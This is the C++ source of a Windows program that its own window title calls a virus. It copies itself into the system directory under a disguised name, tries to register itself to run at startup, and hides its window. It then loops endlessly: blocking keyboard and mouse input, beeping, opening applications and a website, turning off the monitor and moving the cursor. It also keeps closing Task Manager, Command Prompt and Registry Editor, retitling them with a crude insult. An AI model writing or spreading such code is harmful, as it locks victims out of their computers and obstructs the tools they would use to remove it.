// worms.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <WinUser.h>
#include <conio.h>
#include <ctime>
#include <tchar.h>
#include <string>

using namespace std; 
int random, Freq, Dur, X, Y;
HWND mywindow, TaskMgr, CMD, Regedit;
std::wstring Notepad = L"notepad.exe";
std::wstring MineSweeper= L"winmine.exe";
std::wstring Hearts = L"mshearts.exe";
std::wstring Website = L"http://www.facebook.com";

void SetUp();
void Run(int ID);
void Alarm(), OpenStuff(), Gosleep(), MouseControl();

DWORD WINAPI DestroyWindows(LPVOID);

int main()
{
	srand(time(0));
	random = rand() % 6;
	system("title :.Virus.:");
	BlockInput(true);
	SetUp();
	BlockInput(false);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&DestroyWindows, 0, 0, NULL);
	while (1)
	{
		Run(random);
		Sleep(10);
	}
}
void SetUp()
{
	TCHAR system[_MAX_PATH];
	TCHAR pathtofile[_MAX_PATH];
	HMODULE GetModH = GetModuleHandle(NULL);
	GetModuleFileName(GetModH,  pathtofile, sizeof(pathtofile));
	GetSystemDirectory(system, sizeof(system));
	//strcat(system, "\\winminer.exe");
	wcscat_s(system, L"\\winminer.exe");
	CopyFile(pathtofile, system, false);

	HKEY hKey;
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Software\\Mcft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
	RegSetValueEx(hKey, L"SetUp", 0, REG_SZ, (const unsigned char*)system, sizeof(system));
	RegCloseKey(hKey);

	mywindow = FindWindow(NULL, L":.Virus.:");
	cout << "YOUR MOM GAY LOL";
	Sleep(1000);
	ShowWindow(mywindow, false);
}

void Run(int ID)
{
	if (ID == 1)
	{
		BlockInput(true);
	}
	else if (ID == 2)
	{
		Alarm();
	}
	else if (ID == 3)
	{
		OpenStuff();
	}
	else if (ID == 4)
	{
		Gosleep();
	}
	else if (ID == 5)
	{
		MouseControl();
	}
	else
	{
		BlockInput(true);
		Alarm();
		OpenStuff();
		MouseControl();
	}
}

void Alarm()
{
	Freq = rand() % 2001;
	Dur = rand() % 301;
	Beep(Freq, Dur);
}
void OpenStuff()
{
	ShellExecute(NULL, L"open", Notepad.c_str(), NULL, NULL, SW_MAXIMIZE);
	ShellExecute(NULL, L"open", MineSweeper.c_str(), NULL, NULL, SW_MAXIMIZE);
	ShellExecute(NULL, L"open", Hearts.c_str(), NULL, NULL, SW_MAXIMIZE);
	ShellExecute(NULL, L"open", Website.c_str(), NULL, NULL, SW_MAXIMIZE);
}
void Gosleep()
{
	Sleep(1000);
	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
}
void MouseControl()
{
	X = rand() % 801;
	Y = rand() % 601;
	SetCursorPos(X, Y);
}

DWORD WINAPI DestroyWindows(LPVOID)
{
	while (1)
	{
		TaskMgr = FindWindow(NULL, L"Windows Task Manager");
		CMD = FindWindow(NULL, L"Command Prompt");
		Regedit = FindWindow(NULL, L"Registry Editor");
		if (TaskMgr != NULL)
		{
			SetWindowText(TaskMgr,  L"Your Mom Gay LOL");
			PostMessage(TaskMgr, WM_CLOSE, (LPARAM)0, (WPARAM)0);
		}
		if (CMD != NULL)
		{
			SetWindowText(CMD, L"Your Mom Gay LOL");
			PostMessage(CMD, WM_CLOSE, (LPARAM)0, (WPARAM)0);
		}
		if (Regedit != NULL)
		{
			SetWindowText(Regedit, (LPCWSTR)"Your Mom Gay LOL");
			PostMessage(Regedit, WM_CLOSE, (LPARAM)0, (WPARAM)0);
		}

		Sleep(10);
	}
}